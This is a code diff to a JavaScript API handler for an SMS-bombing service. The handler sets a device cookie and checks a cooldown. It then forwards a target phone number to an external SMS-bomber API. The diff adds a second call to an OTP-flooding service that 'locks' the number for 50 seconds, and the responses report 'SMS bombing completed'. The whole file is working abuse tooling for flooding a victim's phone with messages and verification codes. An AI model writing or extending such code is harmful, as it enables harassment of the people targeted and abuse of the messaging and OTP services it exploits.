@@ -37,7 +37,6 @@ export default async function handler(req, res) {
 
   if (!cookieId) {
     cookieId = crypto.randomUUID();
-    // set cookie; Max-Age 1 year, HttpOnly, SameSite Lax
     res.setHeader(
       "Set-Cookie",
       `device_id=${cookieId}; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax`
@@ -54,7 +53,7 @@ export default async function handler(req, res) {
       })()
     ).toString();
 
-  // Generate device hash (uses cookie ID)
+  // Generate device hash
   const deviceId = makeHybridIdHash(userAgent, deviceModel, cookieId);
 
   // Cooldown check
@@ -108,7 +107,7 @@ export default async function handler(req, res) {
       throw new Error("15 minutes Cooldown (no API key available)");
     }
 
-    // Step 2: Send SMS
+    // Step 2: Send SMS via Toshisms API
     const smsResponse = await fetch("https://toshismsbmbapi.up.railway.app/api/send-sms", {
       method: "POST",
       headers: {
@@ -120,64 +119,52 @@ export default async function handler(req, res) {
 
     const downstream = await smsResponse.json().catch(() => ({}));
 
-    // If SMS succeeded (2xx), set cooldown and return the requested success shape.
-    if (smsResponse.ok) {
+    // Step 3: Send OTP via bomba API (locked 50 seconds)
+    const otpResponse = await fetch("https://bomba-vrl7.onrender.com/send-otp", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        phone_no: phoneNumber,
+        seconds: 50
+      })
+    });
+
+    const otpDownstream = await otpResponse.json().catch(() => ({}));
+
+    // Combine both results
+    if (smsResponse.ok || otpResponse.ok) {
       cooldowns.set(deviceId, Date.now());
-
-      // Extract fields from downstream response where possible, otherwise use sensible defaults.
-      // The downstream API may provide different field names; we attempt several common ones.
-      const successCount = Number(
-        downstream.successCount ??
-        downstream.successes ??
-        downstream.sent ??
-        downstream.delivered ??
-        (typeof downstream.total === "number" ? downstream.total : null) ??
-        0
-      );
-
-      const failCount = Number(
-        downstream.failCount ??
-        downstream.failures ??
-        downstream.failed ??
-        (typeof downstream.errors === "number" ? downstream.errors : null) ??
-        0
-      );
-
-      // If both counts are zero (downstream didn't provide), assume one attempt equals success if 2xx.
-      const computedSuccessCount = successCount || (successCount === 0 && failCount === 0 ? 1 : successCount);
-      const computedFailCount = failCount || (successCount === 0 && failCount === 0 ? 0 : failCount);
-
-      const totalAttempts = computedSuccessCount + computedFailCount;
-
-      const creditsUsed = Number(
-        downstream.creditsUsed ??
-        downstream.credits ??
-        computedSuccessCount
-      );
-
-      const remainingCredits = typeof downstream.remainingCredits !== "undefined"
-        ? Number(downstream.remainingCredits)
-        : (typeof downstream.balance !== "undefined" ? Number(downstream.balance) : null);
 
       const responsePayload = {
         success: true,
-        message: "SMS bombing completed",
+        message: "SMS bombing completed (includes OTP schedule)",
         data: {
           phoneNumber: String(phoneNumber),
           requestedAmount: Number(amount),
-          successCount: computedSuccessCount,
-          failCount: computedFailCount,
-          totalAttempts: totalAttempts,
-          creditsUsed: creditsUsed,
-          remainingCredits: remainingCredits,
+          secondsLocked: 50,
+          smsApi: {
+            success: smsResponse.ok,
+            message: downstream.message ?? "SMS API response received",
+            successCount: downstream.successCount ?? null,
+            failCount: downstream.failCount ?? null
+          },
+          otpApi: {
+            success: otpResponse.ok,
+            message: otpDownstream.message ?? "OTP scheduled"
+          },
           timestamp: new Date().toISOString()
         }
       };
 
       return res.status(200).json(responsePayload);
     } else {
-      // Downstream returned error - pass it through (status + body) for debugging/handling
-      return res.status(smsResponse.status).json(downstream);
+      return res.status(500).json({
+        error: "Both SMS and OTP API requests failed",
+        smsApi: downstream,
+        otpApi: otpDownstream
+      });
     }
   } catch (error) {
     return res.status(500).json({ error: error.message || "Internal Server Error" });
